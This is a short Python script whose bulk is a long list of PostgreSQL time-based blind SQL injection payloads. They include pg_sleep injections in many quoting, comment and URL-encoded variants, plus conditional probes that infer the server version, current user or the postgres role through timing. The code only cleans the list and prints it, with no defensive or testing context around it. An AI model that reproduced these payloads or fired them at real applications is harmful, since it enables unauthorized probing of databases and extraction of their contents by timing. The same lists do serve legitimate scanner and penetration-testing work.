# Raw multiline payloads string (your input)
raw_payloads = """
        ";SELECT pg_sleep(30);--",
"';SELECT pg_sleep(30);--",
"');SELECT pg_sleep(30);--",
"');SELECT pg_sleep(30)--",
"');SELECT pg_sleep(30)/*comment*/--",
"';SELECT pg_sleep(30)/*comment*/--",
"'; select pg_sleep(30) --",
"'; select pg_sleep(30); --",
"'; select pg_sleep(30)/*comment*/ --",
"'||pg_sleep(30)||'",
"'||pg_sleep('30')||'",
"'||pg_sleep(30.0)||'",
"'||pg_sleep(30)::text||'",
"'||pg_sleep(30)::text--",
"'||pg_sleep(30) --",
"'||pg_sleep(30)/*comment*/--",
"(select pg_sleep(30))",
"(select pg_sleep('30'))",
"(select pg_sleep(30.0))",
"(select pg_sleep(30)::text)",
"(select pg_sleep(30) FROM generate_series(1,1))",
"(select 1 from pg_sleep(30))",
"1 or pg_sleep(30)--",
"1 or pg_sleep(30)::text is not null--",
"1);select pg_sleep(30);--",
"1 AND (SELECT pg_sleep(30))",
"' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(30) ELSE 0 END)--",
"' OR (SELECT CASE WHEN ascii(substr(version(),1,1))=49 THEN pg_sleep(30) ELSE 0 END)--",
"' OR (SELECT COUNT(*) FROM pg_user WHERE usename='postgres')>0 AND pg_sleep(30)--",
"(select pg_sleep(30) from generate_series(1,1))",
"(select pg_sleep(30) from pg_stat_activity where datname=current_database())",
"(select 0 from (select pg_sleep(30)) x)",
"'||(SELECT pg_advisory_lock(9999),pg_sleep(30),pg_advisory_unlock(9999))||'",
"' OR (SELECT pg_advisory_lock(9999),pg_sleep(30),pg_advisory_unlock(9999))--",
"'||(SELECT (CHR(116)||CHR(98)||CHR(102)||CHR(72)) WHERE 4351=4351 AND 1951=(SELECT 1951 FROM PG_SLEEP(30)))||'",
"'||(SELECT (CHR(111)||CHR(107)||CHR(101)||CHR(109)) WHERE 5889=5889 AND 9736=(SELECT 9736 FROM PG_SLEEP(30)))||'",
"(SELECT (CASE WHEN (1329=1329) THEN (SELECT 1329 FROM PG_SLEEP(30)) ELSE 1/(SELECT 0) END))",
"'||(SELECT pg_sleep_for('30 seconds'))||'",
"'||(SELECT pg_sleep_until(current_timestamp + interval '30 seconds'))||'",
"(select 1 from pg_sleep(30) where current_schema() = 'public')",
"(select unnest(array[pg_sleep(30)]))",
"(select pg_sleep('30'::int))",
"(select 1 from pg_stat_database where xact_commit > 1000 and pg_sleep(30))",
"(select 1 from pg_sleep(30) where substring(current_user from 1 for 1) = 'p')",
"' AND (SELECT pg_sleep(30)) IS NULL--",
"'||pg_sleep(30)::text||'",
"AND 'XYZ'||pg_sleep(30)||'XYZ'='XYZXYZ'",
"0' XOR (CASE WHEN current_timestamp = current_timestamp THEN pg_sleep(30) ELSE 0 END) XOR 'Z",
"%3BSELECT+pg_sleep(30)--",
"%3BSELECT%20pg_sleep(30);--",
"%27%7C%7Cpg_sleep(30)%7C%7C%27",
"%3Bselect+pg_sleep(30)--",
"%29+AND+1234%3D(SELECT+1234+FROM+pg_sleep(30))+AND+('abc'%3D'abc",
"(select pg_advisory_lock(1234), pg_sleep(30), pg_advisory_unlock(1234))--",
"(select pg_advisory_lock(54321); select pg_sleep(30); select pg_advisory_unlock(54321))--",
"1; DO $$ BEGIN PERFORM pg_advisory_lock(9999); PERFORM pg_sleep(30); PERFORM pg_advisory_unlock(9999); END; $$;--",
"WITH delay AS (SELECT pg_sleep(30)) SELECT * FROM delay;--",
"WITH recursive sleeper AS (SELECT 1 AS n UNION ALL SELECT n+1 FROM sleeper WHERE n<1 AND pg_sleep(30)=0) SELECT * FROM sleeper;--",
"SELECT CASE WHEN EXISTS (SELECT 1 FROM pg_user WHERE usename='postgres') THEN pg_sleep(30) ELSE pg_sleep(0) END;--",
"SELECT CASE WHEN (SELECT COUNT(*) FROM information_schema.tables) > 0 THEN pg_sleep(30) ELSE 0 END;--",
"' OR 1=(SELECT 1 WHERE 'a' IN (SELECT 'a' WHERE pg_sleep(30)=0))--",
"' OR EXISTS(SELECT 1 FROM pg_class WHERE relname='pg_user' AND pg_sleep(30)=0)--",
"SELECT * FROM (SELECT pg_sleep(30)) AS t;--",
"(SELECT * FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0) UNION SELECT pg_sleep(30);--",
"' OR (SELECT CASE WHEN ascii(substring(current_user,1,1)) = 112 THEN pg_sleep(30) ELSE 0 END);--",
"' OR (SELECT CASE WHEN substring(version(),1,5)='Postg' THEN pg_sleep(30) ELSE 0 END);--",
"'||CHR(112)||CHR(103)||CHR(95)||CHR(115)||CHR(108)||CHR(101)||CHR(101)||CHR(112)(30)||'",
"0' || pg_sleep(30) || '1",
"'||(SELECT pg_sleep(30)::text)||'",
"%27%20OR%20pg_sleep(30)--",
"%27%7C%7Cpg_sleep%2830%29%7C%7C%27",
"SELECT pg_sleep(30) FROM pg_stat_activity WHERE pid = pg_backend_pid();--",
"SELECT pg_sleep(30) FROM pg_locks LIMIT 1;--",
"SELECT pg_sleep(30) FROM pg_settings WHERE name='log_min_duration_statement';--",
"SELECT pg_sleep_for('30 seconds');--",
"SELECT pg_sleep_until(now() + interval '30 seconds');--",
"1=CASE WHEN (SELECT COUNT(*) FROM pg_user) > 0 THEN pg_sleep(30) ELSE 1 END--",
"1=CASE WHEN (SELECT setting FROM pg_settings WHERE name='server_version') LIKE '13%' THEN pg_sleep(30) ELSE 1 END--",
"SELECT CASE WHEN to_char(clock_timestamp(), 'HH24:MI') = '12:00' THEN pg_sleep(30) ELSE NULL END;--",
"SELECT * FROM generate_series(1, 99999999999) WHERE pg_sleep(30)=0;--",
"SELECT array_agg(pg_sleep(30)) FROM generate_series(1,6);--",
"%3B+SELECT+pg_sleep(30);--",
"%27+OR+1=1;+SELECT+pg_sleep(30);--",
"%27+UNION+SELECT+pg_sleep%2830%29--",
"'%20OR%20(SELECT%20pg_sleep(30))%20IS%20NOT%20NULL--",
"1%27%20AND%20EXISTS(SELECT%201%20FROM%20pg_sleep(30))--",
"%27%20OR%20EXISTS(SELECT%201%20WHERE%20pg_sleep(30)=0)--",
"0%27%20OR%20pg_sleep%2830%29%20IS%20NOT%20NULL--",
"' OR TRUE; SELECT pg_sleep(30);--",
"0);SELECT CASE WHEN 1=1 THEN pg_sleep(30) ELSE NULL END;--",
"' UNION SELECT NULL FROM pg_sleep(30)--",
"' OR NOT NOT pg_sleep(30)--",
"' AND 0=(SELECT COUNT(*) FROM pg_class WHERE relname='pg_user' AND pg_sleep(30)=0)--",
"' OR (SELECT TRUE FROM generate_series(1,1) WHERE pg_sleep(30)=0)--",
"1' AND EXISTS(SELECT 1 FROM pg_roles WHERE rolname='postgres' AND pg_sleep(30)=0)--",
"' OR COALESCE(NULL, pg_sleep(30)) IS NULL--",
"' UNION SELECT generate_series(1,3), pg_sleep(30)--",
"' OR (SELECT 1 FROM (SELECT pg_sleep(30)) AS tmp)--",
"' OR EXISTS(SELECT 1 WHERE 1=1 AND pg_sleep(30)=0)--",
"0); DO $$ BEGIN PERFORM pg_sleep(30); END $$;--",
"(SELECT pg_sleep(30), table_schema FROM information_schema.tables LIMIT 1)--",
"'||(SELECT encode(E'\\x4142', 'hex') || pg_sleep(30)::text)||'",
"';SET statement_timeout TO 31000; SELECT pg_sleep(30);--",
"' OR to_tsvector('test') @@ to_tsquery('test') AND pg_sleep(30)--",
"SELECT * FROM (VALUES (1), (2), (pg_sleep(30))) AS t(val);--",
"SELECT * FROM (SELECT 1) s(a) JOIN LATERAL (SELECT pg_sleep(30)) AS s2(b) ON TRUE;--",
"SELECT * FROM (SELECT 1 as x WHERE pg_sleep(30)=0) as delay;--",
"SELECT * FROM (SELECT 1) AS t1 CROSS JOIN LATERAL (SELECT pg_sleep(30)) AS t2;--",
"' OR pg_sleep(30)--",
"' OR pg_sleep(30)/*comment*/--",
"' OR pg_sleep(30)::int--",
"' OR pg_sleep(30)::text--",
"' OR pg_sleep(30)::varchar--",
"' OR pg_sleep(30)::text = pg_sleep(30)::text--",
"' OR CAST(pg_sleep(30) AS INTEGER)--",
"' OR CAST(pg_sleep(30) AS TEXT)--",
"' OR CAST(pg_sleep(30) AS VARCHAR)--",
"' OR EXISTS (SELECT pg_sleep(30))--",
"' OR NOT EXISTS (SELECT pg_sleep(30))--",
"' OR pg_sleep(30) = 0--",
"' OR pg_sleep(30) != 0--",
"' OR pg_sleep(30) > 0--",
"' OR pg_sleep(30) >= 30--",
"' OR pg_sleep(30) < 100--",
"' OR pg_sleep(30) <= 30--",
"' OR (SELECT pg_sleep(30)) IS NOT NULL--",
"' OR (SELECT pg_sleep(30)) IS NULL--",
"' AND pg_sleep(30)--",
"' AND pg_sleep(30)/*comment*/--",
"' AND 1 = (SELECT pg_sleep(30))--",
"' AND (SELECT pg_sleep(30)) = 0--",
"' OR 1=1; SELECT pg_sleep(30)--",
"' OR 1=1; pg_sleep(30);--",
"'; SELECT pg_sleep(30); --",
"'; EXECUTE pg_sleep(30); --",
"'; PERFORM pg_sleep(30); --",
"'; DO $$ BEGIN PERFORM pg_sleep(30); END $$; --",
"'; DO $$ BEGIN EXECUTE 'SELECT pg_sleep(30)'; END $$; --",
"'; WITH sleeper AS (SELECT pg_sleep(30)) SELECT * FROM sleeper; --",
"' UNION ALL SELECT pg_sleep(30)--",
"' UNION SELECT pg_sleep(30) --",
"' UNION SELECT pg_sleep(30)::text --",
"' UNION SELECT 1, pg_sleep(30) --",
"' UNION ALL SELECT 1, pg_sleep(30) --",
"') OR pg_sleep(30) --",
"') OR pg_sleep(30) /*comment*/ --",
"') AND pg_sleep(30) --",
"') AND pg_sleep(30) /*comment*/ --",
"' OR pg_sleep(30) > 10--",
"' OR pg_sleep(30) = (SELECT 30)--",
"' OR pg_sleep(30) = (SELECT 1+29)--",
"') OR 1=pg_sleep(30)--",
"') OR 1=pg_sleep(30) /*comment*/--",
"' OR pg_sleep(30)::text LIKE '%' --",
"' OR pg_sleep(30)::interval = INTERVAL '30 seconds' --",
"' OR pg_sleep(30)::interval > INTERVAL '20 seconds' --",
"' OR CASE WHEN 1=1 THEN pg_sleep(30) ELSE 0 END --",
"' OR CASE WHEN 1=0 THEN 0 ELSE pg_sleep(30) END --",
"' OR CASE WHEN EXISTS(SELECT 1) THEN pg_sleep(30) ELSE 0 END --",
"' OR CASE WHEN pg_sleep(30) IS NULL THEN 0 ELSE 1 END --",
"' OR (SELECT pg_sleep(30))::text = '0' --",
"' OR CAST(pg_sleep(30) AS BOOLEAN) --", 
"' OR (SELECT pg_sleep(30) FROM pg_stat_activity LIMIT 1) --",
"%27%20OR%20pg_sleep%2830%29--",
"%27%20AND%20pg_sleep%2830%29--",
"%27%20OR%20CAST%28pg_sleep%2830%29%20AS%20TEXT%29--",
"%27%20OR%20CASE%20WHEN%201=1%20THEN%20pg_sleep%2830%29%20ELSE%200%20END--",
"%27%20UNION%20ALL%20SELECT%20pg_sleep%2830%29--",
"%27%20OR%20(SELECT%20pg_sleep%2830%29)%20IS%20NOT%20NULL--"

"""

# Remove surrounding double quotes and strip whitespace
payloads = [line.strip().strip('",') for line in raw_payloads.strip().splitlines() if line.strip()]

# Display the cleaned list
for payload in payloads:
    print(payload)